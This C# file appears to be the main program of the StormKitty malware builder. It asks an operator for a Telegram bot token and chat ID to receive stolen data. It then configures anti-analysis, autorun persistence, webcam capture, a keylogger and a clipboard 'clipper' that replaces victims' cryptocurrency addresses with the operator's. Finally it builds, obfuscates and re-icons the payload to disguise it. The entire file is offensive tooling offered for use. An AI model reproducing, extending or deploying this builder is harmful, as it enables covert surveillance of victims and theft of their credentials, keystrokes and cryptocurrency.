/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/StormKitty
*/

using System;

namespace StormKittyBuilder
{
    class Program
    {
        [STAThreadAttribute]
        static void Main(string[] args)
        {
            // Settings
            string token = cli.GetStringValue("Telegram API token");
            string chatid = cli.GetStringValue("Telegram chat ID");
            // Test connection to telegram API
            if (!telegram.SendMessage("✅ *StormKitty* builder connected successfully!", token, chatid))
                cli.ShowError("Failed connect to telegram bot api!");
            else
                cli.ShowSuccess("Connected successfully!\n");

            // Encrypt values
            build.ConfigValues["Telegram API"] = crypt.EncryptConfig(token);
            build.ConfigValues["Telegram ID"] = crypt.EncryptConfig(chatid);
            // Installation
            build.ConfigValues["AntiAnalysis"] = cli.GetBoolValue("Use anti analysis?");
            build.ConfigValues["Startup"] = cli.GetBoolValue("Install autorun?");
            build.ConfigValues["StartDelay"] = cli.GetBoolValue("Use random start delay?");
            // Modules
            if(build.ConfigValues["Startup"].Equals("1")) {
                build.ConfigValues["WebcamScreenshot"] = cli.GetBoolValue("Create webcam screenshots?");
                build.ConfigValues["Keylogger"] = cli.GetBoolValue("Install keylogger?");
                build.ConfigValues["Clipper"] = cli.GetBoolValue("Install clipper?");
            }
            // Clipper addresses
            if (build.ConfigValues["Clipper"].Equals("1"))
            {
                build.ConfigValues["ClipperBTC"] = cli.GetEncryptedString("Clipper : Your bitcoin address");
                build.ConfigValues["ClipperETH"] = cli.GetEncryptedString("Clipper : Your etherium address");
                build.ConfigValues["ClipperXMR"] = cli.GetEncryptedString("Clipper : Your monero address");
                build.ConfigValues["ClipperXRP"] = cli.GetEncryptedString("Clipper : Your ripple address");
                build.ConfigValues["ClipperLTC"] = cli.GetEncryptedString("Clipper : Your litecoin address");
                build.ConfigValues["ClipperBCH"] = cli.GetEncryptedString("Clipper : Your bitcoin cash address");
            }
            // Build
            string builded = build.BuildStub();
            string confuzed = obfuscation.Obfuscate(builded);
            // Select icon
            if (System.IO.Directory.Exists("icons"))
                if (cli.GetBoolValue("Do you want change file icon?") == "1")
                {
                    string icon = cli.GetIconPath();
                    if (icon != null)
                        IconChanger.InjectIcon(confuzed, icon);
                }
            // Done
            cli.ShowSuccess("Obfuscated stub: " + confuzed + " saved.");
            Console.ReadLine();
        }
    }
}
